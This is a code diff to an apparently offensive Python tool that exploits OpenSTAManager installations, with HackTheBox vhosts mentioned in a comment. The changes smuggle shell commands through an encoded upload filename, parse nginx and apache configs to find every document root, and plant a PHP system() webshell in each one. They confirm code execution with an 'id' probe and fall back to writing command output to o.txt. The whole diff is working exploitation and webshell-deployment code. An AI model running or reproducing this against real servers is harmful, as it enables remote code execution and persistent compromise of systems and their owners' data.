@@ -31,6 +31,7 @@ import http.cookiejar
 import io
 import os
 import re
+import shlex
 import ssl
 import subprocess
 import urllib.error
@@ -447,13 +448,19 @@ def _upload(opener, ctx, filename: str) -> bool:
         return False
 
 
-def _webroots(base: str) -> List[str]:
+def _webroots(base: str, vhost: str = "") -> List[str]:
     env = os.environ.get("SCRYER_OSM_WEBROOT")
     roots = [env] if env else []
     roots += ["/var/www/html/openstamanager", "/var/www/html",
               "/var/www/openstamanager", "/var/www/openstamanager/public",
               "/var/www/html/openstamanager/public", "/var/www/support",
               "/var/www/html/support"]
+    # vhost-named docroots (HTB serves each vhost from its own dir, e.g.
+    # /var/www/support_001.enigma.htb) — with and without the domain suffix.
+    names = [n for n in (vhost, vhost.split(".")[0] if vhost else "") if n]
+    for n in names:
+        roots += [f"/var/www/{n}", f"/var/www/html/{n}", f"/var/www/{n}/public",
+                  f"/var/www/{n}/html"]
     # sub-path install (base ends /openstamanager) -> that dir under docroot
     m = re.search(r"//[^/]+/(.+)$", base)
     if m:
@@ -461,53 +468,64 @@ def _webroots(base: str) -> List[str]:
     return list(dict.fromkeys(r for r in roots if r))
 
 
+def _roots_shell_expr(base: str, vhost: str) -> str:
+    """A shell $(...) expression that expands to every candidate docroot: the
+    roots nginx/apache actually serve (parsed from their configs) plus static
+    fallbacks. This removes webroot guessing — the server tells us its roots."""
+    static = " ".join(shlex.quote(w) for w in _webroots(base, vhost))
+    return (
+        "$(grep -rhoE 'root[[:space:]]+[^;]+;' /etc/nginx /etc/apache2 "
+        "/etc/httpd 2>/dev/null | sed -E 's/^[[:space:]]*root[[:space:]]+//; "
+        "s/;.*//' | tr -d '\"' | sort -u) " + static)
+
+
 def _make_channel(host: HostReport, opener, base: str, vhost: str, ctx):
-    """Find the webroot that maps to this vhost, drop a PHP webshell there, and
-    return run_cmd(cmd)->output. Falls back to a per-command o.txt exfil."""
+    """Drop a PHP webshell into EVERY docroot the web server serves (discovered
+    from its own config, no guessing), confirm via a marker fetched at the vhost
+    root, and return run_cmd(cmd)->output. Falls back to per-command o.txt exfil
+    written to all those roots."""
     import time
     shell = "scryer_" + os.urandom(3).hex() + ".php"
-    for webroot in _webroots(base):
-        mark = "SX" + os.urandom(4).hex()
-        drop = ("{ echo '<?php system($_REQUEST[\"c\"]); ?>' > %s/%s ; echo %s ; } "
-                "> %s/o.txt 2>&1" % (webroot, shell, mark, webroot))
-        _upload(opener, ctx, _encode_filename(drop))
-        # confirm via the output file
-        ok = False
-        for _ in range(12):
-            if mark in _oget(opener, base + "/o.txt"):
-                ok = True
-                break
+    mark = "SX" + os.urandom(4).hex()
+    php = '<?php system($_REQUEST["c"]); ?>'
+    roots = _roots_shell_expr(base, vhost)
+    drop = ("S=%s; for r in %s; do printf '%%s' \"$S\" > \"$r/%s\" 2>/dev/null; "
+            "echo %s > \"$r/o.txt\" 2>/dev/null; done"
+            % (shlex.quote(php), roots, shell, mark))
+    _upload(opener, ctx, _encode_filename(drop))
+
+    ok = False
+    for _ in range(15):
+        if mark in _oget(opener, base + "/o.txt"):
+            ok = True
+            break
+        time.sleep(0.5)
+    if not ok:
+        return None
+
+    # prefer the persistent webshell (one request per command)
+    probe = _oget(opener, base + "/" + shell + "?c="
+                  + urllib.parse.quote("echo " + mark + "; id"))
+    if mark in probe and "uid=" in probe:
+        utils.log("good", f"webshell live at {base}/{shell}", indent=1)
+        return lambda cmd: _oget(opener, base + "/" + shell + "?c="
+                                 + urllib.parse.quote(cmd))
+
+    # webshell not served (docroot != php-exec dir) but o.txt exfil works
+    utils.log("good", "P7M exec confirmed (o.txt exfil)", indent=1)
+
+    def run_out(cmd: str) -> str:
+        mk = "RC" + os.urandom(4).hex()
+        ex = ("for r in %s; do { %s ; echo %s ; } > \"$r/o.txt\" 2>/dev/null; done"
+              % (roots, cmd, mk))
+        _upload(opener, ctx, _encode_filename(ex))
+        for _ in range(16):
+            body = _oget(opener, base + "/o.txt")
+            if mk in body:
+                return body.split(mk)[0]
             time.sleep(0.5)
-        if not ok:
-            continue
-        # webshell reachable?  prefer it (one request per command)
-        probe = _oget(opener, base + "/" + shell + "?c=" + urllib.parse.quote(
-            "echo " + mark + "; id"))
-        if mark in probe and "uid=" in probe:
-            utils.log("good", f"webshell live at {base}/{shell} (webroot {webroot})",
-                      indent=1)
-
-            def run_shell(cmd: str) -> str:
-                out = _oget(opener, base + "/" + shell + "?c="
-                            + urllib.parse.quote(cmd))
-                return out
-            return run_shell
-        # webshell not served but o.txt exfil works -> per-command channel
-        utils.log("good", f"P7M exec confirmed (o.txt exfil, webroot {webroot})",
-                  indent=1)
-
-        def run_out(cmd: str, _wr=webroot) -> str:
-            mk = "RC" + os.urandom(4).hex()
-            ex = "{ %s ; echo %s ; } > %s/o.txt 2>&1" % (cmd, mk, _wr)
-            _upload(opener, ctx, _encode_filename(ex))
-            for _ in range(16):
-                body = _oget(opener, base + "/o.txt")
-                if mk in body:
-                    return body.split(mk)[0]
-                time.sleep(0.5)
-            return ""
-        return run_out
-    return None
+        return ""
+    return run_out
 
 
 def _multipart(field: str, filename: str, content: bytes):
